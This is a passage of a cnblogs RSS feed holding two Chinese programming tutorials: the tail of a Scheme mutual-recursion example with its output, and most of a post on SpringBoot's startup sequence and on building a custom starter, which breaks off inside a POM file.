 )
)
(define (type2&lt;/span&gt;?&lt;span&gt; x)
 (&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (= x &lt;span&gt;0&lt;/span&gt;&lt;span&gt;)
  #f
  (type1&lt;/span&gt;? (- x &lt;span&gt;1&lt;/span&gt;&lt;span&gt;))
 )
)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;　　我们可以看到，&lt;/p&gt;
&lt;p&gt;　　type0?的定义中用到type2?&lt;/p&gt;
&lt;p&gt;　　type1?的定义中用到type0?&lt;/p&gt;
&lt;p&gt;　　type2?的定义中用到type1?&lt;/p&gt;

&lt;p&gt;　　测试一下，&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
(&lt;span&gt;for&lt;/span&gt;-&lt;span&gt;each
 (lambda (x) (display x)(newline))
 (map
  (lambda (x)
   (cons
    x
    (map (lambda (f) (f x)) (list type0&lt;/span&gt;? type1? type2?&lt;span&gt;))
   )
  )
  (range &lt;/span&gt;&lt;span&gt;20&lt;/span&gt;&lt;span&gt;)
 )
)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;　　得到&lt;/p&gt;

&lt;p&gt;&lt;span&gt;(0 #t #f #f)&lt;/span&gt;&lt;br/&gt;&lt;span&gt;(1 #f #t #f)&lt;/span&gt;&lt;br/&gt;&lt;span&gt;(2 #f #f #t)&lt;/span&gt;&lt;br/&gt;&lt;span&gt;(3 #t #f #f)&lt;/span&gt;&lt;br/&gt;&lt;span&gt;(4 #f #t #f)&lt;/span&gt;&lt;br/&gt;&lt;span&gt;(5 #f #f #t)&lt;/span&gt;&lt;br/&gt;&lt;span&gt;(6 #t #f #f)&lt;/span&gt;&lt;br/&gt;&lt;span&gt;(7 #f #t #f)&lt;/span&gt;&lt;br/&gt;&lt;span&gt;(8 #f #f #t)&lt;/span&gt;&lt;br/&gt;&lt;span&gt;(9 #t #f #f)&lt;/span&gt;&lt;br/&gt;&lt;span&gt;(10 #f #t #f)&lt;/span&gt;&lt;br/&gt;&lt;span&gt;(11 #f #f #t)&lt;/span&gt;&lt;br/&gt;&lt;span&gt;(12 #t #f #f)&lt;/span&gt;&lt;br/&gt;&lt;span&gt;(13 #f #t #f)&lt;/span&gt;&lt;br/&gt;&lt;span&gt;(14 #f #f #t)&lt;/span&gt;&lt;br/&gt;&lt;span&gt;(15 #t #f #f)&lt;/span&gt;&lt;br/&gt;&lt;span&gt;(16 #f #t #f)&lt;/span&gt;&lt;br/&gt;&lt;span&gt;(17 #f #f #t)&lt;/span&gt;&lt;br/&gt;&lt;span&gt;(18 #t #f #f)&lt;/span&gt;&lt;br/&gt;&lt;span&gt;(19 #f #t #f)&lt;/span&gt;&lt;/p&gt;
</description>
<pubDate>Sun, 28 Apr 2019 15:06:00 +0000</pubDate>
<dc:creator>窗户</dc:creator>
<og:description>相互递归就是多个函数互相定义，最常见的就是两个函数，比如f和g，f的定义中用到g，而g的定义中用到f。 相互递归一样有无限递归的可能，最简单的: f:x-&gt;g(x) g:x-&gt;f(x) 给</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/Colin-Cai/p/10787636.html</dc:identifier>
</item>
<item>
<title>SpringBoot之旅第六篇-启动原理及自定义starter - 茶底世界</title>
<link>http://www.cnblogs.com/yuanqinnan/p/10784508.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/yuanqinnan/p/10784508.html</guid>
<description>&lt;h2&gt;一、引言&lt;/h2&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;SpringBoot的一大优势就是Starter，由于SpringBoot有很多开箱即用的Starter依赖，使得我们开发变得简单，我们不需要过多的关注框架的配置。&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;在日常开发中，我们也会自定义一些Starter，特别是现在微服务框架，我们一个项目分成了多个单体项目，而这些单体项目中会引用公司的一些组件，这个时候我们定义Starter，可以使这些单体项目快速搭起，我们只需要关注业务开发。&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block md-focus&quot;&gt;&lt;span&gt;在此之前我们再深入的了解下SpringBoot启动原理。而后再将如何自定义starter。&lt;/span&gt;&lt;/p&gt;
&lt;h2 class=&quot;md-end-block md-heading md-focus&quot;&gt;&lt;span class=&quot;md-expand&quot;&gt;二、 启动原理&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span class=&quot;md-expand&quot;&gt;要想了解启动原理，我们可以Debug模式跟着代码一步步探究，我们从入口方法开始：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; ConfigurableApplicationContext run(Class&amp;lt;?&amp;gt;&lt;span&gt;[] primarySources,
      String[] args) {
   &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; SpringApplication(primarySources).run(args);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;这里是创建一个SpringApplication对象，并调用了run方法&lt;/p&gt;
&lt;h3 class=&quot;md-end-block md-heading md-focus&quot;&gt;&lt;span class=&quot;md-expand&quot;&gt;2.1 创建SpringApplication对象&lt;/span&gt;&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; SpringApplication(ResourceLoader resourceLoader, Class&amp;lt;?&amp;gt;&lt;span&gt;... primarySources) {
    &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.resourceLoader =&lt;span&gt; resourceLoader;
    Assert.notNull(primarySources, &lt;/span&gt;&quot;PrimarySources must not be null&quot;&lt;span&gt;);
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;保存主配置类 &lt;/span&gt;
    &lt;span&gt;this&lt;/span&gt;.primarySources = &lt;span&gt;new&lt;/span&gt; LinkedHashSet&amp;lt;&amp;gt;&lt;span&gt;(Arrays.asList(primarySources));
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;确定web应用类型&lt;/span&gt;
    &lt;span&gt;this&lt;/span&gt;.webApplicationType =&lt;span&gt; WebApplicationType.deduceFromClasspath();
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;从类路径下找到META-INF/spring.factories配置的所有ApplicationContextInitializer；然后保存起来&lt;/span&gt;
&lt;span&gt;    setInitializers((Collection) getSpringFactoriesInstances(
          ApplicationContextInitializer.&lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;));
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;从类路径下找到ETA-INF/spring.factories配置的所有ApplicationListener&lt;/span&gt;
    setListeners((Collection) getSpringFactoriesInstances(ApplicationListener.&lt;span&gt;class&lt;/span&gt;&lt;span&gt;));
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;从多个配置类中找到有main方法的主配置类&lt;/span&gt;
    &lt;span&gt;this&lt;/span&gt;.mainApplicationClass =&lt;span&gt; deduceMainApplicationClass();
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;从这个方法中可以看出，这个&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;&lt;strong&gt;第一步&lt;/strong&gt;&lt;span&gt;：保存主配置类。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;&lt;strong&gt;第二步&lt;/strong&gt;&lt;span&gt;：确定web应用类型。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block md-focus&quot;&gt;&lt;span&gt;&lt;strong&gt;第三步&lt;/strong&gt;&lt;span&gt;：setInitializers方法，这个方法走我们看带入的参数是getSpringFactoriesInstances(ApplicationContextInitializer.class)，我们再往下查看getSpringFactoriesInstances&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block md-focus&quot;&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1113901/201904/1113901-20190428154758279-1489615021.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;再进入这个方法：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1113901/201904/1113901-20190428154829265-1495577981.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这里就是从类路径下找到META-INF/spring.factories配置的所有ApplicationContextInitializer，然后再保存起来，放开断点，我们可以看到这个时候获取到的&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1113901/201904/1113901-20190428154906731-1327862419.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-expand&quot;&gt;&lt;strong&gt;&lt;span&gt;第四步&lt;/span&gt;&lt;/strong&gt;&lt;span class=&quot;md-expand&quot;&gt;：从类路径下找到ETA-INF/spring.factories配置的所有ApplicationListener，原理也基本类似,进入断点&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-expand&quot;&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1113901/201904/1113901-20190428154943207-949343738.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-expand&quot;&gt;&lt;strong&gt;&lt;span&gt;第五步&lt;/span&gt;&lt;/strong&gt;&lt;span class=&quot;md-expand&quot;&gt;：从多个配置类中找到有main方法的主配置类。这个执行完之后，SpringApplication就创建完成&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h3 class=&quot;md-end-block md-heading md-focus&quot;&gt;&lt;span class=&quot;md-expand&quot;&gt;2.2 run方法&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span class=&quot;md-expand&quot;&gt;先贴出代码&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;54&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt;&lt;span&gt; ConfigurableApplicationContext run(String... args) {
   StopWatch stopWatch &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; StopWatch();
   stopWatch.start();
   ConfigurableApplicationContext context &lt;/span&gt;= &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
   Collection&lt;/span&gt;&amp;lt;SpringBootExceptionReporter&amp;gt; exceptionReporters = &lt;span&gt;new&lt;/span&gt; ArrayList&amp;lt;&amp;gt;&lt;span&gt;();
   configureHeadlessProperty();
   &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;从类路径下META-INF/spring.factories获取SpringApplicationRunListeners&lt;/span&gt;
   SpringApplicationRunListeners listeners =&lt;span&gt; getRunListeners(args);
   &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;回调所有的获取SpringApplicationRunListener.starting()方法&lt;/span&gt;
&lt;span&gt;   listeners.starting();
   &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;封装命令行参数&lt;/span&gt;
      ApplicationArguments applicationArguments = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; DefaultApplicationArguments(
            args);
       &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;准备环境 &lt;/span&gt;
      ConfigurableEnvironment environment =&lt;span&gt; prepareEnvironment(listeners,
            applicationArguments);&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;创建环境完成后回调SpringApplicationRunListener.environmentPrepared()；表示环境准备完成&lt;/span&gt;
&lt;span&gt;      configureIgnoreBeanInfo(environment);
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;打印Banner图&lt;/span&gt;
      Banner printedBanner =&lt;span&gt; printBanner(environment);
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;创建ApplicationContext,决定创建web的ioc还是普通的ioc  &lt;/span&gt;
      context =&lt;span&gt; createApplicationContext();
       &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;异常分析报告&lt;/span&gt;
      exceptionReporters =&lt;span&gt; getSpringFactoriesInstances(
            SpringBootExceptionReporter.&lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;,
            &lt;/span&gt;&lt;span&gt;new&lt;/span&gt; Class[] { ConfigurableApplicationContext.&lt;span&gt;class&lt;/span&gt;&lt;span&gt; }, context);
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;准备上下文环境，将environment保存到ioc中
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;applyInitializers()：回调之前保存的所有的ApplicationContextInitializer的initialize方法 
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;listeners.contextPrepared(context) 
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;prepareContext运行完成以后回调所有的SpringApplicationRunListener的contextLoaded（）&lt;/span&gt;
&lt;span&gt;      prepareContext(context, environment, listeners, applicationArguments,
            printedBanner);
       &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;刷新容器,ioc容器初始化（如果是web应用还会创建嵌入式的Tomcat）
       &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;扫描，创建，加载所有组件的地方,（配置类，组件，自动配置）&lt;/span&gt;
&lt;span&gt;      refreshContext(context);       
      afterRefresh(context, applicationArguments);
      stopWatch.stop();
      &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.logStartupInfo) {
         &lt;/span&gt;&lt;span&gt;new&lt;/span&gt; StartupInfoLogger(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.mainApplicationClass)
               .logStarted(getApplicationLog(), stopWatch);
      }
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;所有的SpringApplicationRunListener回调started方法&lt;/span&gt;
&lt;span&gt;      listeners.started(context);
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;从ioc容器中获取所有的ApplicationRunner和CommandLineRunner进行回调，
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;ApplicationRunner先回调，CommandLineRunner再回调&lt;/span&gt;
&lt;span&gt;      callRunners(context, applicationArguments);
   }
   &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (Throwable ex) {
      handleRunFailure(context, ex, exceptionReporters, listeners);
      &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; IllegalStateException(ex);
   }

   &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
       &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;所有的SpringApplicationRunListener回调running方法&lt;/span&gt;
&lt;span&gt;      listeners.running(context);
   }
   &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (Throwable ex) {
      handleRunFailure(context, ex, exceptionReporters, &lt;/span&gt;&lt;span&gt;null&lt;/span&gt;&lt;span&gt;);
      &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; IllegalStateException(ex);
   }
   &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;整个SpringBoot应用启动完成以后返回启动的ioc容器&lt;/span&gt;
   &lt;span&gt;return&lt;/span&gt;&lt;span&gt; context;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;前面的代码不用分析，主要是准备对象，我们从 SpringApplicationRunListeners listeners = getRunListeners(args)开始分析，&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;&lt;strong&gt;第一步&lt;/strong&gt;&lt;span&gt;：是从类路径下META-INF/spring.factories获取SpringApplicationRunListeners，&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;这个方法跟前面分析的两个获取配置方法类似。&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;&lt;strong&gt;第二步&lt;/strong&gt;&lt;span&gt;：回调所有的获取SpringApplicationRunListener.starting()方法。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;&lt;strong&gt;第三步&lt;/strong&gt;&lt;span&gt;： 封装命令行参数。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;&lt;strong&gt;第四步&lt;/strong&gt;&lt;span&gt;：准备环境，调用prepareEnvironment方法。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;&lt;strong&gt;第五步&lt;/strong&gt;&lt;span&gt;：打印Banner图（就是启动时的标识图）。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;&lt;strong&gt;第六步&lt;/strong&gt;&lt;span&gt;：创建ApplicationContext,决定创建web的ioc还是普通的ioc。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;&lt;strong&gt;第七步&lt;/strong&gt;&lt;span&gt;：异常分析报告。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;&lt;strong&gt;第八步&lt;/strong&gt;&lt;span&gt;：准备上下文环境，将environment保存到ioc中，这个方法需要仔细分析下，我们再进入这个方法&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1113901/201904/1113901-20190428155130078-526787422.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;这里面有一个applyInitializers方法,这里是回调之前保存的所有的ApplicationContextInitializer的initialize方法&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1113901/201904/1113901-20190428155215651-365002939.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;还有一个listeners.contextPrepared(context)，这里是回调所有的SpringApplicationRunListener的contextPrepared()，&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;最后listeners.contextLoaded(context) 是prepareContext运行完成以后回调所有的SpringApplicationRunListener的contextLoaded（）。&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;&lt;strong&gt;第九步&lt;/strong&gt;&lt;span&gt;：刷新容器,ioc容器初始化（如果是web应用还会创建嵌入式的Tomcat）,这个就是扫描，创建，加载所有组件的地方,（配置类，组件，自动配置）。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;&lt;strong&gt;第十步&lt;/strong&gt;&lt;span&gt;：所有的SpringApplicationRunListener回调started方法。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;&lt;strong&gt;第十一步&lt;/strong&gt;&lt;span&gt;：从ioc容器中获取所有的ApplicationRunner和CommandLineRunner进行回调，ApplicationRunner先回调，CommandLineRunner再回调。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;&lt;strong&gt;第十二步&lt;/strong&gt;&lt;span&gt;：所有的SpringApplicationRunListener回调running方法。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;&lt;strong&gt;第十三步&lt;/strong&gt;&lt;span&gt;：整个SpringBoot应用启动完成以后返回启动的ioc容器。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block md-focus&quot;&gt;&lt;span&gt;这就是run的全部过程，想要更详细的了解还需自己去看源码。&lt;/span&gt;&lt;/p&gt;
&lt;h2 class=&quot;md-end-block md-focus&quot;&gt;&lt;span&gt;三、&lt;/span&gt;&lt;span class=&quot;md-expand&quot;&gt;自定义starter&lt;/span&gt;&lt;/h2&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;自定义starter（场景启动器），我们要做的事情是两个：确定依赖和编写自动配置。我们重点要做的就是编写自动配置，我们之前写过一些自动配置，主要是注解配置的使用，主要的注解有：&lt;/span&gt;&lt;/p&gt;
&lt;ul class=&quot;ul-list&quot; data-mark=&quot;-&quot; readability=&quot;3&quot;&gt;&lt;li class=&quot;md-list-item&quot; readability=&quot;-1&quot;&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;@Configuration ：指定这个类是一个配置类&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li class=&quot;md-list-item&quot; readability=&quot;-1&quot;&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;@ConditionalOnXXX ：在指定条件成立的情况下自动配置类生效&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li class=&quot;md-list-item&quot; readability=&quot;-1&quot;&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;@AutoConfigureAfter：指定自动配置类的顺序&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li class=&quot;md-list-item&quot; readability=&quot;-1&quot;&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;@Bean：给容器中添加组件&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li class=&quot;md-list-item&quot; readability=&quot;-1&quot;&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;@ConfigurationPropertie：结合相关xxxProperties类来绑定相关的配置&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li class=&quot;md-list-item&quot; readability=&quot;-1&quot;&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;@EnableConfigurationProperties：让xxxProperties生效加入到容器中&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;按照这些注解写好自动配置类后，我们还需要进行自动配置的加载，加载方式是将需要启动就加载的自动配置类，配置在META-INF/spring.factories，启动器的大致原理是如此，而启动器的实际设计是有一定模式的，就是&lt;span&gt;&lt;strong&gt;启动器模块是一个空 JAR 文件，仅提供辅助性依赖管理&lt;/strong&gt;&lt;span&gt;，而自动配置模块应该再重新设计一个，然后启动器再去引用这个自动配置模块。Springboot就是如此设计的：&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1113901/201904/1113901-20190428155316224-1071755220.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;另外还有一个命名规则：&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;官方命名空间&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;&lt;span class=&quot;md-softbreak&quot;&gt;&lt;span&gt;– 前缀：“spring-boot-starter-”&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;&lt;span class=&quot;md-softbreak&quot;&gt;&lt;span&gt;&lt;span class=&quot;md-softbreak&quot;&gt;&lt;span&gt;– 模式：spring-boot-starter-模块名&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;&lt;span class=&quot;md-softbreak&quot;&gt;&lt;span&gt;&lt;span class=&quot;md-softbreak&quot;&gt;&lt;span&gt;&lt;span class=&quot;md-softbreak&quot;&gt;&lt;span&gt;– 举例：spring-boot-starter-web、spring-boot-starter-actuator、spring-boot-starter-jdbc&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block md-focus&quot;&gt;&lt;span&gt;自定义命名空间&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block md-focus&quot;&gt;&lt;span&gt;&lt;span class=&quot;md-softbreak&quot;&gt;&lt;span&gt;– 后缀：“-spring-boot-starter”&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block md-focus&quot;&gt;&lt;span&gt;&lt;span class=&quot;md-softbreak&quot;&gt;&lt;span&gt;&lt;span class=&quot;md-softbreak&quot;&gt;&lt;span&gt;– 模式：模块-spring-boot-starter&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block md-focus&quot;&gt;&lt;span&gt;&lt;span class=&quot;md-softbreak&quot;&gt;&lt;span&gt;&lt;span class=&quot;md-softbreak&quot;&gt;&lt;span&gt;&lt;span class=&quot;md-softbreak&quot;&gt;&lt;span&gt;– 举例：mybatis-spring-boot-starter&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h3 class=&quot;md-end-block md-heading md-focus&quot;&gt;&lt;span class=&quot;md-expand&quot;&gt;3.1 创建自定义starter&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span class=&quot;md-expand&quot;&gt;&lt;span class=&quot;md-expand&quot;&gt;&lt;strong&gt;&lt;span&gt;第一步：&lt;/span&gt;&lt;/strong&gt;&lt;span class=&quot;md-expand&quot;&gt;因为我们需要创建两个模块，所以先新建一个空的项目，然后以模块形式创建两个模块。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1113901/201904/1113901-20190428155452574-1060804299.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-expand&quot;&gt;&lt;strong&gt;&lt;span&gt;第二步&lt;/span&gt;&lt;/strong&gt;&lt;span class=&quot;md-expand&quot;&gt;：再创建两个模块，一个starter和一个自动配置模块&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-expand&quot;&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1113901/201904/1113901-20190428155534999-1053963651.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;具体的创建过程就不赘述了，就是最简单的项目，去掉不需要的文件，创建完成结构如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1113901/201904/1113901-20190428155558403-1771037522.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block md-focus&quot;&gt;&lt;span&gt;&lt;strong&gt;第三步&lt;/strong&gt;&lt;span&gt;：我们先将自动配置模块导入starter中，让启动模块依赖自动配置模块&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;启动模块的POM文件加入依赖&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;dependencies&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt;引入自动配置模块&lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;com.yuanqinnan-starter&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;yuanqinnan-springboot-starter-autoconfigurer&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
